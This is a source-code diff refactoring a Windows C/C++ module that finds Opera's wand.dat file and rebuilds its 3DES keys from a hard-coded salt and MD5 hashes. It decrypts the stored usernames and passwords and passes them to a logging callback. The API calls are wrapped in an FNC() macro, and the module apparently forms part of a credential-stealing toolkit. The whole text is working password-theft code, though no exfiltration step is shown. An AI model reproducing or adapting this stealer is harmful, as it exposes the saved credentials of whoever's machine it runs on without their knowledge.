@@ -1,19 +1,13 @@
-
 #define _CRT_SECURE_NO_WARNINGS 1
 
+#include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 
-#include <windows.h>
-
-#include <cstdio>
-#include <iostream>
-#include <memory>
-
 #include <crypto/md5.h>
 #include <crypto/des.h>
-#include "..\common.h"
+#include "../common.h"
 
 const unsigned char opera_salt[11] = { 0x83, 0x7D, 0xFC, 0x0F, 0x8E, 0xB3, 0xE8, 0x69, 0x73, 0xAF, 0xFF };
 
@@ -26,50 +20,85 @@ struct p_entry {
 	WCHAR pass_value[255];
 };
 
+struct hash_opera {
+	BYTE hashSignature1[MD5_DIGEST_LENGTH];
+	BYTE hashSignature2[MD5_DIGEST_LENGTH];
+	BYTE tmpBuffer[256];
+};
+
 // callback for the password
 extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);
 
+static WCHAR* GetOPProfilePath(WCHAR* FullPath, size_t size, const WCHAR* lpDirectory, const WCHAR* lpWandFile)
+{
+	WCHAR appPath[MAX_PATH];
+
+	FNC(GetEnvironmentVariableW)(L"APPDATA", appPath, MAX_PATH);
+
+	_snwprintf_s(FullPath, size, _TRUNCATE, L"%s\\%s\\%s", appPath, lpDirectory, lpWandFile);
+
+	return FullPath;
+}
 // Function declarations..
-WCHAR *GetOPProfilePath();
+static inline WCHAR* GetOPProfilePath(WCHAR *FullPath, size_t size, const WCHAR *lpWandFile)
+{
+	return GetOPProfilePath(FullPath, size, L"Opera\\Opera\\profile", lpWandFile);
+}
+
+static inline WCHAR* GetOPProfilePath11(WCHAR* FullPath, size_t size, const WCHAR* lpWandFile)
+{
+	return GetOPProfilePath(FullPath, size, L"Opera\\Opera", lpWandFile);
+}
+
 
 #define SAFE_FREE(x) do { if (x) {free(x); x=NULL;} } while (0);
 
 #define FORM_FIELDS 0x0c020000
-int DumpOP(WCHAR *profilePath, WCHAR *signonFile)
+
+static BYTE* getFileContent(LPCWSTR lpFileName, LPDWORD FileSize)
 {
-	WCHAR wandPath[MAX_PATH];
-	unsigned char *wandData, *wandMap;
-	unsigned long fileSize;
+	if (lpFileName == NULL)
+		return NULL;
+
 	HANDLE hFile;
-	HANDLE hMap;
-	p_entry opentry;
-
-	memset(&opentry, 0, sizeof(opentry));
-
-	_snwprintf_s(wandPath, MAX_PATH, _TRUNCATE, L"%s\\%s", profilePath, signonFile);
-
-	if ((hFile = FNC(CreateFileW)(wandPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
+	if ((hFile = FNC(CreateFileW)(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
 		return 0;
-
-	fileSize = FNC(GetFileSize)(hFile, NULL);
-
+	
+	*FileSize = FNC(GetFileSize)(hFile, NULL);
+	HANDLE hMap;
 	if ((hMap = FNC(CreateFileMappingA)(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == INVALID_HANDLE_VALUE) {
 		CloseHandle(hFile);
 		return 0;
 	}
 
-	wandMap = (unsigned char *)FNC(MapViewOfFile)(hMap, FILE_MAP_READ, 0, 0, 0);
+	BYTE *wandMap = (BYTE*)FNC(MapViewOfFile)(hMap, FILE_MAP_READ, 0, 0, 0);
 
-	wandData = (unsigned char *)malloc(fileSize);
-	memcpy(wandData, wandMap, fileSize);
-	
+	BYTE *ptr = (unsigned char*)malloc(*FileSize);
+
+	if (wandMap != NULL && ptr != NULL)
+		memcpy(ptr, wandMap, *FileSize);
+	else
+		*FileSize = 0;
+
 	CloseHandle(hFile);
 	FNC(UnmapViewOfFile)(wandMap);
 	CloseHandle(hMap);
+	return ptr;
+}
+
+static int DumpOP(WCHAR *wandPath)
+{
+	unsigned char *wandData, *wandMap;
+	p_entry opentry;
+
+	memset(&opentry, 0, sizeof(opentry));
+
+	DWORD fileSize = 0;
+	wandData = getFileContent(wandPath, &fileSize);
 
 	swprintf_s(opentry.service, 255, L"Opera");
 
-	unsigned long wandOffset = 0;
+	DWORD wandOffset = 0;
 	int field_num = 0;
 
 	//
@@ -119,40 +148,35 @@ int DumpOP(WCHAR *profilePath, WCHAR *signonFile)
 		if (dataLength > fileSize - (wandOffset + DES_KEY_SZ + 4) || dataLength < 8 || dataLength % 8 != 0)
 			continue;
 
-		unsigned char
-			hashSignature1[MD5_DIGEST_LENGTH],
-			hashSignature2[MD5_DIGEST_LENGTH],
-			tmpBuffer[256];
+		struct hash_opera data;
+		memset(&data, 0, sizeof(hash_opera));
 
-		memset(hashSignature1, 0, MD5_DIGEST_LENGTH);
-		memset(hashSignature2, 0, MD5_DIGEST_LENGTH);
-		memset(tmpBuffer, 0, 256);
 		//
 		// hashing of (salt, key), (hash, salt, key)
 		//
 
-		memcpy(tmpBuffer, opera_salt, sizeof(opera_salt));
-		memcpy(tmpBuffer + sizeof(opera_salt), wandKey, DES_KEY_SZ);
+		memcpy(data.tmpBuffer, opera_salt, sizeof(opera_salt));
+		memcpy(data.tmpBuffer + sizeof(opera_salt), wandKey, DES_KEY_SZ);
 
-		MD5(tmpBuffer, sizeof(opera_salt) + DES_KEY_SZ, hashSignature1);
+		MD5(data.tmpBuffer, sizeof(opera_salt) + DES_KEY_SZ, data.hashSignature1);
 
-		memcpy(tmpBuffer, hashSignature1, sizeof(hashSignature1));
-		memcpy(tmpBuffer + sizeof(hashSignature1), opera_salt, sizeof(opera_salt));
+		memcpy(data.tmpBuffer, data.hashSignature1, sizeof(data.hashSignature1));
+		memcpy(data.tmpBuffer + sizeof(data.hashSignature1), opera_salt, sizeof(opera_salt));
 
-		memcpy(tmpBuffer + sizeof(hashSignature1) + sizeof(opera_salt), wandKey, DES_KEY_SZ);
+		memcpy(data.tmpBuffer + sizeof(data.hashSignature1) + sizeof(opera_salt), wandKey, DES_KEY_SZ);
 
-		MD5(tmpBuffer, sizeof(hashSignature1) + sizeof(opera_salt) + DES_KEY_SZ, hashSignature2);
+		MD5(data.tmpBuffer, sizeof(data.hashSignature1) + sizeof(opera_salt) + DES_KEY_SZ, data.hashSignature2);
 
 		//
 		// schedule keys. key material from hashes
 		//
 		DES_key_schedule key_schedule1, key_schedule2, key_schedule3;
-		DES_set_key_unchecked((const_DES_cblock *)&hashSignature1[0], &key_schedule1);
-		DES_set_key_unchecked((const_DES_cblock *)&hashSignature1[8], &key_schedule2);
-		DES_set_key_unchecked((const_DES_cblock *)&hashSignature2[0], &key_schedule3);
+		DES_set_key_unchecked((const_DES_cblock *)&data.hashSignature1[0], &key_schedule1);
+		DES_set_key_unchecked((const_DES_cblock *)&data.hashSignature1[8], &key_schedule2);
+		DES_set_key_unchecked((const_DES_cblock *)&data.hashSignature2[0], &key_schedule3);
 
 		DES_cblock iVector;
-		memcpy(iVector, &hashSignature2[8], sizeof(DES_cblock));
+		memcpy(iVector, &data.hashSignature2[8], sizeof(DES_cblock));
 
 		unsigned char *cryptoData = wandKey + DES_KEY_SZ + 4;
 
@@ -200,39 +224,14 @@ int DumpOP(WCHAR *profilePath, WCHAR *signonFile)
 	return 1;
 }
 
-WCHAR *GetOPProfilePath()
-{
-	WCHAR appPath[MAX_PATH];
-	static WCHAR FullPath[MAX_PATH];
- 
-	FNC(GetEnvironmentVariableW)(L"APPDATA", appPath, MAX_PATH);
-
-	_snwprintf_s(FullPath, MAX_PATH, L"%s\\Opera\\Opera\\profile", appPath);
-
-	return FullPath;
-}
-
-WCHAR *GetOPProfilePath11()
-{
-	WCHAR appPath[MAX_PATH];
-	static WCHAR FullPath[MAX_PATH];
- 
-	FNC(GetEnvironmentVariableW)(L"APPDATA", appPath, MAX_PATH);
-
-	_snwprintf_s(FullPath, MAX_PATH, L"%s\\Opera\\Opera", appPath);
-
-	return FullPath;
-}
-
-
 int DumpOpera(void)
 {
-	WCHAR *ProfilePath = NULL; 	//Profile path
+	WCHAR ProfilePath[MAX_PATH] = {};
 
-	ProfilePath = GetOPProfilePath();	
-	DumpOP(ProfilePath, L"wand.dat");   
-	ProfilePath = GetOPProfilePath11();	
-	DumpOP(ProfilePath, L"wand.dat");   
+	GetOPProfilePath(ProfilePath, sizeof(ProfilePath), L"wand.dat");
+	DumpOP(ProfilePath);
+	GetOPProfilePath11(ProfilePath, sizeof(ProfilePath), L"wand.dat");
+	DumpOP(ProfilePath);   
 
 	return 0;
 }
